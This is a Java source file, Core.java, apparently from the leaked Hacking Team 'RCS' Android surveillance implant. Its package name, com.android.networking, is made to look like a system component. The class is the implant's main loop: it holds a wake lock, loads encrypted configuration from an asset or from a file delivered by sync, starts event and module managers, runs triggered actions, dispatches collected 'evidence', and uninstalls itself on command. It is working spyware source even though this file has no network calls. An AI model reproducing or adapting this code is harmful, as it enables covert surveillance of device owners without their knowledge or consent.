/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.networking;

import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.res.Resources;
import android.os.Debug.MemoryInfo;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

import com.android.networking.action.Action;
import com.android.networking.action.SubAction;
import com.android.networking.action.UninstallAction;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfType;
import com.android.networking.conf.Configuration;
import com.android.networking.evidence.Evidence;
import com.android.networking.evidence.Markup;
import com.android.networking.file.AutoFile;
import com.android.networking.file.Path;
import com.android.networking.manager.ManagerEvent;
import com.android.networking.manager.ManagerModule;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

/**
 * The Class Core, represents
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core"; //$NON-NLS-1$
	private static boolean serviceRunning = false;

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The core thread. */
	private Thread coreThread = null;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private ManagerModule moduleManager;

	/** The event manager. */
	private ManagerEvent eventManager;
	private WakeLock wl;
	// private long queueSemaphore;
	private Thread fastQueueThread;
	private CheckAction checkActionFast;
	private PendingIntent alarmIntent = null;

	@SuppressWarnings("unused")
	private void Core() {

	}

	static Core singleton;

	public synchronized static Core self() {
		if (singleton == null) {
			singleton = new Core();
		}
	
		return singleton;
	}

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */

	public boolean Start(final Resources resources, final ContentResolver cr) {
		if (serviceRunning == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
			}

			return false;
		}

		coreThread = new Thread(this);

		moduleManager = ManagerModule.self();
		eventManager = ManagerEvent.self();
		
		contentResolver = cr;
		if (Cfg.DEBUG) {
			coreThread.setName(getClass().getSimpleName());
			Check.asserts(resources != null, "Null Resources"); //$NON-NLS-1$
		}

		try {
			coreThread.start();
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		// mRedrawHandler.sleep(1000);

		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
		wl.acquire();

		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$

		serviceRunning = true;
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;

		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
		}

		wl.release();

		coreThread = null;

		serviceRunning = false;
		return true;
	}

	public static boolean isServiceRunning() {
		return serviceRunning;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
			// startTrace();
		}

		if (Cfg.DEMO) {
			Beep.beepPenta();
		}

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
			}

			int confLoaded = taskInit();
			// viene letta la conf e vengono fatti partire agenti e eventi
			if (confLoaded == ConfType.Error) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
				}

			} else {

				if (Cfg.DEBUG) {
					Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
				}

				// Torna true in caso di UNINSTALL o false in caso di stop del
				// servizio
				checkActions();

				if (Cfg.DEBUG) {
					Check.log(TAG + "CheckActions() wants to exit"); //$NON-NLS-1$
				}
			}

			stopAll();
		} catch (final Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
			}
		} finally {
			if (Cfg.DEBUG) {
				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
			}

			Utils.sleep(1000);

			System.runFinalizersOnExit(true);
			finish();
			// System.exit(0);
		}
	}

	private synchronized boolean checkActions() {

		checkActionFast = new CheckAction(Action.FAST_QUEUE);

		fastQueueThread = new Thread(checkActionFast);
		fastQueueThread.start();

		return checkActions(Action.MAIN_QUEUE);

	}

	class CheckAction implements Runnable {

		private final int queue;

		CheckAction(int queue) {
			this.queue = queue;
		}

		public void run() {
			boolean ret = checkActions(queue);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if UNINSTALL
	 */
	private boolean checkActions(int qq) {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$

				}

				if (Cfg.MEMOSTAT) {
					logMemory();
				}

				final Trigger[] actionIds = status.getTriggeredActions(qq);

				if (actionIds.length == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
					}
				}

				if (Cfg.DEMO) {
					Beep.beepPenta();
				}

				for (final Trigger trigger : actionIds) {
					final Action action = status.getAction(trigger.getActionId());
					final Exit exitValue = executeAction(action, trigger);

					if (exitValue == Exit.UNINSTALL) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
						}

						UninstallAction.actualExecute();

						return true;
					}
				}
			}

			return false;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
			}

			return false;
		}
	}

	private synchronized void stopAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");
		}

		final Status status = Status.self();

		// status.setRestarting(true);
		if (Cfg.DEBUG) {
			Check.log(TAG + " Warn: " + "checkActions: unTriggerAll"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		status.unTriggerAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
		}

		moduleManager.stopAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
		}

		eventManager.stopAll();

		Utils.sleep(2000);

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
		}

		status.unTriggerAll();

		final EvDispatcher logDispatcher = EvDispatcher.self();

		if (!logDispatcher.isAlive()) {
			logDispatcher.waitOnEmptyQueue();
			logDispatcher.halt();
		}

	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private int taskInit() {
		try {
			Path.makeDirs();

			final Markup markup = new Markup(0);
			if (markup.isMarkup()) {
				UninstallAction.actualExecute();
				return ConfType.Error;
			}

			// Identify the device uniquely
			final Device device = Device.self();

			int ret = loadConf();

			if (ret == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			// Start log dispatcher
			final EvDispatcher logDispatcher = EvDispatcher.self();

			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread
			if (eventManager.startAll() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
			}

			/*
			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
			 * 
			 * return ConfType.Error; }
			 */

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
			}

			return ret;

		} catch (final GeneralException rcse) {
			if (Cfg.EXCEPTION) {
				Check.log(rcse);
			}

			if (Cfg.DEBUG) {
				Check.log(rcse);//$NON-NLS-1$
				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " Exception() detected"); //$NON-NLS-1$
			}
		}

		return ConfType.Error;
	}

	public boolean verifyNewConf() {
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
		boolean loaded = false;

		if (file.exists()) {
			loaded = loadConfFile(file, false);
		}

		return loaded;
	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public int loadConf() throws GeneralException {
		boolean loaded = false;
		int ret = ConfType.Error;

		if (Cfg.DEMO) {
			// Beep.beep();
		}

		if (Cfg.DEBUG) {

			Check.log(TAG + " (loadConf): TRY NEWCONF");
		}

		// tries to load the file got from the sync, if any.
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);

		if (file.exists()) {
			loaded = loadConfFile(file, true);

			if (!loaded) {
				Evidence.info(Messages.getString("30.2")); //$NON-NLS-1$
				file.delete();
			} else {
				Evidence.info(Messages.getString("30.3")); //$NON-NLS-1$
				file.rename(Path.conf() + ConfType.ActualConf);
				ret = ConfType.NewConf;
			}
		}

		// get the actual configuration
		if (!loaded) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConf): TRY ACTUALCONF");
			}
			file = new AutoFile(Path.conf() + ConfType.ActualConf);

			if (file.exists()) {
				loaded = loadConfFile(file, true);

				if (!loaded) {
					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
				} else {
					ret = ConfType.ActualConf;
				}
			}
		}

		if (!loaded && Cfg.DEBUG) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConf): TRY JSONCONF");
			}

			final byte[] resource = Utils.getAsset("c.bin"); // config.bin
			String json = new String(resource);
			// Initialize the configuration object

			if (json != null) {
				final Configuration conf = new Configuration(json);
				// Load the configuration
				loaded = conf.loadConfiguration(true);

				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
				}

				if (loaded) {
					ret = ConfType.ResourceJson;
				}
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConf): TRY RESCONF");
			}
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.getAsset("c.bin"); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.loadConfiguration(true);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
			}

			if (loaded) {
				ret = ConfType.ResourceConf;
			}
		}

		return ret;
	}

	private boolean loadConfFile(AutoFile file, boolean instantiate) {
		boolean loaded = false;
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConfFile): " + file);
			}

			final byte[] resource = file.read(8);
			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.loadConfiguration(instantiate);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
			}

		} catch (GeneralException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}

		return loaded;
	}

	/**
	 * Execute action. (Questa non viene decompilata correttamente.)
	 * 
	 * @param action
	 *            the action
	 * @param baseEvent
	 * @return the int
	 */
	private Exit executeAction(final Action action, Trigger trigger) {
		Exit exit = Exit.SUCCESS;

		if (Cfg.DEBUG) {
			Check.log(TAG + " CheckActions() triggered: " + action); //$NON-NLS-1$
		}

		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		int i = 1;

		for (final SubAction subAction : action.getSubActions()) {
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ action);
				}

				subAction.prepareExecute();
				final boolean ret = subAction.execute(trigger);

				if (status.uninstall) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
					}

					// UninstallAction.actualExecute();
					exit = Exit.UNINSTALL;
					break;
				}

				if (ret == false) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: " + "CheckActions() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
					}

					continue;
				} else {
					if (subAction.considerStop()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (executeAction): stop");
						}
						break;
					}
				}
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);
					Check.log(TAG + " Error: checkActions for: " + ex); //$NON-NLS-1$
				}
			}
		}

		return exit;
	}

	public static void logMemory() {
		Status.self();
		ActivityManager activityManager = (ActivityManager) Status.getAppContext().getSystemService(ACTIVITY_SERVICE);
		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
		activityManager.getMemoryInfo(memoryInfo);

		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem , true);
		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory , true);
		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold , true);

		int pid = android.os.Process.myPid();
		int pids[] = new int[] { pid };

		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty() ,
					true);
			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss() , true);
			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty() , true);
		}

	}

	public synchronized boolean reloadConf() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (reloadConf): START");
		}

		if (verifyNewConf()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): valid conf");
			}

			stopAll();

			int ret = taskInit();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): END");
			}

			return ret != ConfType.Error;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): invalid conf");
			}

			return false;
		}
	}
}
